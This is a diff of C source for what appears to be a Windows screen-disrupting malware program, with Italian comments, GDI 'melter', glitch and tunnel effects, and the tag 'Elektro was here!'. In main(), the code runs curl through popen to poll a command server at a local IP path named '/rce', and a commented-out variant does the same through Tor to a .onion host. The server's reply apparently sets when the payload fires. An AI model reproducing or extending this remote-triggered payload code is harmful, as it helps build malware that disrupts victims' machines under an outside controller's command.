@@ -114,7 +114,11 @@ void squarefx_run() {
     static int vx = 21;
     static int vy = 21;
 
-    HBRUSH white = CreateSolidBrush(RGB(255, 255, 255)); // crea pennello brushed bianco
+    int red = rand() % 255;
+    int green = rand() % 255;
+    int blue = rand() % 255;
+
+    HBRUSH white = CreateSolidBrush(RGB(red, green, blue)); // crea pennello brushed bianco
     SelectObject(hdc, white); // usa sopra l'hdc, con il bianco
 
     Rectangle(hdc, x, y, x + 100, y + 100); // top, left, bottom, right
@@ -243,13 +247,14 @@ void countdown(int secs) { // passa secs da curl
     // fx exhibition
     int i;
     for (i=0;i<50;i++) {TextOut(hdc, w, h, "Elektro was here!", 17);}
-    for (i=0;i<1500;i++) {fkngmelter();}
+    for (i=0;i<500;i++) {fkngmelter();}
     for (i=0;i<50;i++) {TextOut(hdc, w, h, "lesgo", 5);}
-    for (i=0;i<500;i++) {heightglitch_run();}
+    for (i=0;i<100;i++) {heightglitch_run();}
     for (i=0;i<50;i++) {TextOut(hdc, w, h, "Subwoofer", 5);}
-    for (i=0;i<500;i++) {widthglitch_run();}
+    for (i=0;i<100;i++) {widthglitch_run();}
     for (i=0;i<100;i++) {tunnel_run();ltunnel_run();}
-    for (i=0;i<100;i++) {squarefx_run();}
+    for (i=0;i<400;i++) {fkngmelter();}
+    for (i=0;i<600;i++) {squarefx_run();}
     for (i=0;i<100;i++) {circleshake_run();}
     for (i=0;i<4;i++) {tunnel_run();ltunnel_run();}
     for (i=0;i<12;i++) {fkngmelter();heightglitch_run();}
@@ -260,7 +265,7 @@ int main() {
         printf("Clean\n");
         char reqtextbuffer[8192] = {0}; // le {} perche' se metto {x} inizializza tutto a x. Senza graffe no, non posso assegnare un val a un gruppo di cose
         //FILE *pointertotextstream = popen("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r"); // apre curl in modalita' sola lettura. 
-        FILE *pointertotextstream = popen("curl -s http://192.168.1.6:80/rce", "r"); // apre curl in modalita' sola lettura. FILE *pointer apre uno stream su popen, quindi prende l'output (SOLO LA PRIMA RIGA)
+        FILE *pointertotextstream = popen("curl -s http://192.168.122.1:80/rce", "r"); // apre curl in modalita' sola lettura. FILE *pointer apre uno stream su popen, quindi prende l'output (SOLO LA PRIMA RIGA)
 
         if (pointertotextstream == NULL) return 1; // controlla canale tra me e l'exe di curl
         
